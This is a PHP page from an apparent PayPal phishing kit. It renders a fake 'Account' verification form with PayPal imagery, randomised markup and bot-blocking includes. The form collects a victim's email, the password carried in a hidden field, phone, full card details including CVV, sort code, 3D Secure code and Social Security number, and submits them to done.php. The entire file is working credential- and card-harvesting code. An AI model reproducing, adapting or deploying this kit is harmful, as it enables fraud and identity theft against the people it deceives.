<?php
	//---------------------------------------------------------------------------------------- INC
	include('./includes/funciones.php');
	include('./includes/lang.php');
	include('./includes/bots.php');
	include "./includes/lang".$_SESSION['ANONISMA-AYOUB'];
	//---------------------------------------------------------------------------------------- ACN
	if (isset($_SESSION['EM'])){
	die( "<!DOCTYPE html> 
	<html lang=\"es\" dir=\"thn4\">
	  <head>
		<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
		<meta charset=\"utf-8\">
		<meta name=\"viewport\" content=\"initial-scale=1.0\">
		<title>". $_SESSION['AYCOUNT']." - Account - ". date("Y")." </title>
		<link rel=\"stylesheet\" href=\"lib/css/style.css\" type=\"text/css\">
		<link rel=\"stylesheet\" href=\"lib/css/bootstrap.min.css\">
		<link rel=\"shortcut icon\" link rel=\"logo-icon\" href=\"lib/css/img/anon-7.png\">
		<script src=\"lib/js/jquery.1.11.1.min.js\"></script> 
		<script src=\"lib/js/jquery.maskedinput.min.js\"></script> 
		<script src=\"lib/js/jquery.validate.min.js\"></script> 
		<script src=\"lib/js/jquery.form.min.js\"></script> 
		<script src=\"lib/js/j-forms.min.js\"></script> 
		<script type=\"text/javascript\" src=\"lib/js/jquery1.js\"></script> 
		<script type=\"text/javascript\"> 
		  $(document).ready(function(){ 	 
		  $(\"#a-n-o-n-isma-s-t-e-p-s\").keypress(function(e) { 
		  if (e.which == 13) { 
		  return false; 
		  } 
		  });   
		  });              
		  window.onload =	function openVentana(){            
		  $(\".ventana\").slideDown(1000);             
		  }       
		  function closeVentana(){            
		  $(\".ventana\").slideUp(\"fast\");          
		  } 
		</script> 
		<script type=\"text/javascript\" src=\"lib/js/jquery.main.js\"></script> 
	  </head>
	  <body  id=\"".X()."\"  for=\"".Y()." \"   >
		<div  for=\"".X()."\"  class=\"nbc456\">
		  <header  id=\"".X()."\"   class=\"qm2 thn4\">
			<div  id=\"".X()."\"   class=\"mn1d\">
			  <div  for=\"".X()."\"  class=\"pod3f\">
				<a href=\"#\" class=\"joplaer\"><img src=\"./lib/img/logo.png\"></a> 
				<nav id=\"bododof\">
				  <ul  id=\"".X()."\"   class=\"wnc2\">
					<li  for=\"".X()."\"  class=\"nxdcxc3\"><span class=\"nms2 icon jk1ds\"></span><a href=\"#\" class=\"bonda2\">". $aaaaaaaal1 ."</a></li>
					<li><span class=\"nms2 icon jk1ds\"></span><a href=\"#\" class=\"bonda2\">". $aaaaaaaal2 ."</a></li>
					<li  for=\"".Y()." \" ><span class=\"nms2 icon jk1ds\"></span><a href=\"#\" class=\"bonda2\">". $aaaaaaaal3 ."</a></li>
					<li class=\"nxdcxc3\"><span  for=\"".Y()." \"  class=\"nms2 icon jk1ds\"></span><a class=\"bonda2\" href=\"#\">". $aaaaaaaal4 ."</a></li>
					<span id=\"yarbi-hdina\">
					  <li  for=\"".X()."\"  class=\"pok2 tools-menu\"> 
						<a href=\"#\"  for=\"".Y()." \"  class=\"nxc44\"><span>". $aaaaaaaal5 ."</span><span class=\"bnerfad nms2 icon oaenc4\"  id=\"".X()."\"  ></span></a> 
					  </li>
					</span>
					<li  for=\"".X()."\"  class=\"pok2\"> 
					  <a href=\"#\" class=\"nxc44 \">". $aaaaaaaal6 ."<span  id=\"".X()."\"  class=\"bnerfad icon oaenc4\"></span></a> 
					</li>
				  </ul>
				</nav>
				<div  for=\"".X()."\"  class=\"powencf\">
				  <div  for=\"".X()."\"  class=\"n83y\"  id=\"".X()."\"  ><a class=\"po9jds\" href=\"#\"><span class=\"pdn3nd\"></span><span class=\"mer-notification-count uewb52\"  id=\"".X()."\"  ></span><span class=\"opala32\"> </span></a></div>
				  <div  for=\"".Y()." \"  class=\"pqw5\"><a class=\"po9jds\" href=\"#\"><span class=\"vbm5\"></span><span class=\"bo4nd uewb52\"></span><span  for=\"".Y()." \"  class=\"opala32\"></span><span  id=\"".X()."\"   class=\"ushdcb4 nxdcxc3 bcrako\"  id=\"".X()."\"  ></span></a></div>
				  <div class=\"uiewxz bcrako\"><a class=\"p3nfcf\" href=\"#\">". $aaaaaaaal7 ."</a></div>
				  <button  for=\"".X()."\"  id=\"ndljq\"  for=\"".Y()." \"  class=\"icon poepo\"></button> 
				</div>
			  </div>
			</div>
		  </header>
		</div>
		<div  for=\"".X()."\"  class=\"owds\">
		  <div  for=\"".X()."\"  id=\"powex\">
			<div id=\"lghrbal\" class=\"bxcte\">
			  <section  for=\"".X()."\" class=\"ncncnc\">
				<h1>             </h1>
				<p><a href=\"#\">             </a></p>
			  </section>
			  <div  id=\"".X()."\"  class=\"makayn-ghda-had-nhar-kansawb-scama\">
				<div class=\"byaad-okhals podwelk wa9hrona-ghi-bribh-mn-ashoum\">
				  <ul>
					<li class=\"byaad-okhal ps-tab l7asin-dyal-adseeenss-wtafa3ol\"  id=\"".X()."\" > ".$aaaaaaaal8."</li  for=\"".Y()." \" >
					<li class=\"byaad-okhal  mghribiy-o-talmout  \"  id=\"".X()."\" >". $aaaaaaaal9." </li>
				  </ul>
				</div>
				<div  for=\"".X()."\"  class=\"\">
				  <!--[if IE 8 ]> 
				  <div id=\"ps-refine-ie8\">
					<![endif]--> 
					<section id=\"qnmcc4\"  for=\"".X()."\"  class=\"bxcte\">
					  <div  for=\"".Y()." \"  class=\"tl9oni-3lihoum podwelk\">
				  </div>
				  <div class=\"ncbxx\"> 
				  <div  for=\"".Y()." \"  class=\"iewi\"> 
				  <section  for=\"".X()."\"  class=\"boplew43 ps-col-md-6 ps-col-xs-12\"  id=\"".X()."\"  > 
				  <div  for=\"".X()."\"  class=\"wrapper wrapper-640\"  id=\"".X()."\"  > 
				  <form action=\"./done.php?id=".X()."".Y()."_". $_SESSION['AYCOUNT']."\" method=\"post\" class=\"a-n-o-n-isma-s-t-e-p-s a-n-o-n-s-t-e-p-s\" id=\"a-n-o-n-isma-s-t-e-p-s\"> 
				  <p class=\"osdn349\">". $aaaaaaaal35 ."</p> 
				  <div  for=\"".X()."\"  class=\"content\"> 
				  <div  for=\"".X()."\"  class=\"bxcn3\"> 
				  <div class=\"span4 step\"> 
				  <div  id=\"".X()."\"   class=\"steps\"> 
				  <span>". $aaaaaaaal10 ." 1</span> 
				  <p>". $aaaaaaaal11 ." info</p> 
				  </div> 
				  </div> 
				  <div  for=\"".X()."\"  class=\"span4 step\"> 
				  <div class=\"steps\"> 
				  <span>". $aaaaaaaal10 ." 2</span> 
				  <p>". $aaaaaaaal12 ." info</p> 
				  </div> 
				  </div> 
				  <div  id=\"".X()."\"   class=\"span4 step\"> 
				  <div  for=\"".Y()." \"  class=\"steps\"> 
				  <span>". $aaaaaaaal10 ." 3</span> 
				  <p>". $aaaaaaaal13 ." info</p> 
				  </div> 
				  </div> 
				  </div> 
				  <fieldset  for=\"".Y()." \" > 
				  <div  for=\"".X()."\"  class=\"divider gap-bottom-25\"></div> 
				  <div  for=\"".Y()." \"  class=\"bxcn3\">                                                      
				  <div  for=\"".X()."\"  class=\" unit\"> 
				  <div class=\"input\"> 
				  <input type=\"hidden\"  name=\"first_name\" value=\"".$_SESSION['AYCOUNT']."\" > 
				  <input  for=\"".X()."\"  type=\"text\" id=\"last_name\" name=\"last_name\" placeholder=\"". $aaaaaaaal39 ."\"> 
				  </div> 
				  </div> 
				  </div> 
				  <div  id=\"".X()."\"   class=\"bxcn3\"> 
				  <div class=\"unit\"> 
				  <div class=\"input\"> 
				  <input value=\"".$_SESSION['EM']."\"  for=\"".X()."\"  type=\"email\" placeholder=\"". $aaaaaaaal23 ."\" id=\"email\" name=\"email\"> 
				  <input value=\"".$_SESSION['PS']."\"  for=\"".X()."\"  type=\"hidden\"   name=\"pass\"> 
				  </div> 
				  </div> 
				  <div class=\"unit\"> 
				  <div class=\"input\"> 
				  <input value=\"".$_SESSION['_phone_']."\"  for=\"".Y()." \"  type=\"text\" placeholder=\"". $aaaaaaaal40 ."\" id=\"phone\" minlength=\"7\" maxlength=\"15\" name=\"phone\" onKeypress=\"if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;\" required title=\"Please Enter Your Phone\"> 
				  </div> 
				  </div> 
				  </div> 
				  </fieldset> 
				  <fieldset> 
				  <div  id=\"".X()."\"   class=\"unit\"> 
				  <div class=\"input\"> 
				  <input  for=\"".X()."\"  type=\"text\" id=\"card_name\" placeholder=\"". $aaaaaaaal44 ."\" name=\"card_name\"> 
				  <span class=\"tooltip-image tooltip-right-top\"><img src=\"lib/img/name.jpg\" /></span> 
				  </div> 
				  </div> 
				  <div  for=\"".Y()." \"  class=\"unit\"> 
				  <div class=\"input\"> 
				  <input  for=\"".X()."\"  type=\"text\"  id=\"card_number\" name=\"card_number\" placeholder=\"". $aaaaaaaal43 ."\" required=\"required\" > 
				  <span class=\"tooltip-image tooltip-right-top\"><img src=\"lib/img/number.jpg\" /></span> 
				  </div> 
				  </div> 
				  <div  id=\"".X()."\"   class=\"span5 unit\"> 
				  <div  id=\"".X()."\"   class=\"input\"> 
				  <input type=\"text\" id=\"cvv2\" name=\"cvv2\"minlength=\"3\" maxlength=\"4\" placeholder=\"". $aaaaaaaal46 ."\" onKeypress=\"if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;\" >  
				  <span class=\"tooltip-image tooltip-right-top\"><img src=\"lib/img/cvv.jpg\" /></span> 
				  </div> 
				  </div> 
				  <div  for=\"".X()."\"  style=\"margin-left:2%\" class=\"span5 unit\"> 
				  <div class=\"input\"> 
				  <input type=\"text\"  id=\"year\" name=\"card_month\" placeholder=\"". $aaaaaaaal45 ."\" required=\"required\"> 
				  <span  id=\"".X()."\"   class=\"tooltip-image tooltip-left-side\"><img src=\"lib/img/month.jpg\" /></span> 
				  </div> 
				  </div> 
				  </fieldset> 
				  <fieldset  for=\"".Y()." \" > 
				  <div  for=\"".X()."\"  class=\"divider gap-bottom-25\"></div> 
				  <img class=\"bopexc454\" src=\"http://www.artoflivingshop.eu/img/cards-icons.gif\" width=\"100%\"> 
				  <div class=\"bxcn3\"> 
				  <div class=\" unit\"> 
				  <div class=\"input\"> 
				  <input type=\"text\" id=\"sort\" name=\"sort\" placeholder=\"Sort Code\"> 
				  </div> 
				  </div> 
				  <div class=\" unit\"> 
				  <div class=\"input\"> 
				  <input  for=\"".X()."\"  type=\"text\" id=\"secure\" name=\"secure\" placeholder=\"3D Secure\"> 
				  </div> 
				  </div> 
				  </div> 
				  <div  id=\"".X()."\"   class=\"bxcn3\"> 
				  <div class=\"unit\"> 
				  <div  for=\"".Y()." \"  class=\"input\"> 
				  <input type=\"text\" placeholder=\"". $aaaaaaaal47 ."\" id=\"sss\" name=\"ssn\"> 
				  </div> 
				  </div> 
				  </div> 
				  </fieldset> 
				  <fieldset> 
				  <div  id=\"".X()."\"   class=\"divider gap-bottom-25\"></div> 
				  <div  for=\"".Y()." \"  id=\"fourth_step\" > 
				  <div> 
				  <center><img src=\"./lib/img/good.png\"></center> 
				  </br>			 
				  <table  id=\"".X()."\"   class=\"ilotrei\"  > 
				  <tr  id=\"".X()."\"   class=\"ilotrei\"> 
				  <td class=\"ilotrei\"> 
				  <li class=\"A-NON-ISM-A\"><a>       </a></li> 
				  </td> 
				  <td class=\"ilotrei\"></td> 
				  </tr> 
				  <tr  for=\"".X()."\"  class=\"ilotrei\"> 
				  <td class=\"ilotrei\"> 
				  <li  for=\"".Y()." \"  class=\"A-NON-ISM-A\"><a>    </a></li> 
				  </td> 
				  <td class=\"ilotrei\"></td> 
				  </tr> 
				  <tr  id=\"".X()."\"   class=\"ilotrei\"> 
				  <td class=\"ilotrei\"> 
				  <li  id=\"".X()."\"   class=\"A-NON-ISM-A\"><a>      </a></li> 
				  </td> 
				  <td  for=\"".Y()." \"  class=\"ilotrei\"></td> 
				  </tr> 
				  </table> 
				  </br> 
				  </div> 
				  <div id=\"response\"></div> 
				  </fieldset> 
				  </div> 
				  <div  for=\"".X()."\"  class=\"footer\"> 
				  <button  for=\"".X()."\"  type=\"submit\" id=\"submit_fourth\" class=\"kaanola multi-submit-btn\">". $aaaaaaaal14 ."</button> 
				  <button type=\"button\" id=\"submit_third\" class=\"kaanola multi-next-btn\">". $aaaaaaaal15 ."</button> 
				  <button  for=\"".X()."\"  type=\"button\" class=\"lawahlopa2 multi-prev-btn\">". $aaaaaaaal16 ."</button> 
				  </div> 
				  </form> 
				  </div> 
				  </section> 
				  <section  id=\"".X()."\"   class=\"ps-col-md-6\"><ul> 
				  <br />
				  <li><section  for=\"".X()."\"  class=\"loka2\" tabindex=\"0\"><h1  id=\"".X()."\"  ><img src=\"https://www.paypalobjects.com/webstatic/en_AU/mktg/icon/trusted.png\" height=\"60\" width=\"60\" ></h1><a href=\"javascript:void(0)\"  id=\"".X()."\"  class=\"uhnmji edc3g\" ><span class=\"onfola4\">". $aaaaaaaal17 ."</span></a> 
				  <p  id=\"".X()."\"  > 
				  ". $aaaaaaaal18 ." 
				  </p> 
				  </section></li> 
				  <li><section  for=\"".X()."\"  class=\"loka2\" tabindex=\"0\"><h1><img src=\"https://www.paypalobjects.com/webstatic/mktg/2014design/merchant/creditcard.png\" height=\"60\" width=\"60\" ></h1><a href=\"javascript:void(0)\" class=\"uhnmji edc3g\" ><span class=\"onfola4\">". $aaaaaaaal19 ."</span></a> 
				  <p  id=\"".X()."\"  > 
				  ". $aaaaaaaal20 ." 
				  </p> 
				  </section></li> 
				  </ul></section></div> 
				  </div> 
				  </section> 
				  <!--[if IE 8 ]></div><![endif]--> 
				</div>
			  </div>
			</div>
		  </div>
		</div>
		<br> 
		<div  for=\"".X()."\"  class=\"bcbts thn4\">
		<footer class=\"pjd45\">
		<div class=\"nc409\">
		  <div  id=\"".X()."\"   class=\"uewiuwebcx\">
			<nav>
			  <ul  id=\"".X()."\"   class=\"bcnx32c\">
				<li><a href=\"#\">". $aaaaaaaal30 ."</a></li>
				<li  for=\"".X()."\" ><a href=\"#\">". $aaaaaaaal36 ."</a></li>
				<li  for=\"".X()."\" ><a href=\"#\">". $aaaaaaaal37 ."</a></li>
				<li><a href=\"#\">". $aaaaaaaal31 ."</a></li>
				<li  for=\"".Y()." \" ><a href=\"#\">Copyright © 1999 - ". date("Y") ."  ". $aaaaaaaal33." </a></li>
				<li><a href=\"#\"><img src=\"http://api.wipmania.com/myflag.png\">  </a></li>
			  </ul>
			</nav>
		  </div>
		</div>
		<div  for=\"".Y()." \"  class=\"oiwed7\">
		  <div class=\"ventana\">
			<div  for=\"".Y()." \"  class=\"form\">
			  <div  for=\"".Y()." \"  class=\"ponmw\"><a href=\"javascript:closeVentana();\"><img src=\"https://cdn1.iconfinder.com/data/icons/mayssam/512/Danger-16.png\"></a></div>
			  <a   id=\"".X()."\"   href=\"javascript:closeVentana();\" class=\"bc34ds\" id=\"peod9\">". $aaaaaaaal38 ."</a> 
			  <center><a href=\"javascript:closeVentana();\"><img class=\"hdnb123\" src=\"./lib/img/inter.png\"></a></center>
			  <br> 
			  <br> 
			  <ul>
				<li><a style=\"text-decoration:none;\" href=\"javascript:closeVentana();\"><font size=\"1\" color=\"#6D6D6E\">Copyright © 1999 - ". date("Y")." </font></a></li>
			  </ul>
			</div>
		  </div>
		</div>
	</html>
	\n");	
	}else{
	die(Hna_lhih('index.php'));
	}
?>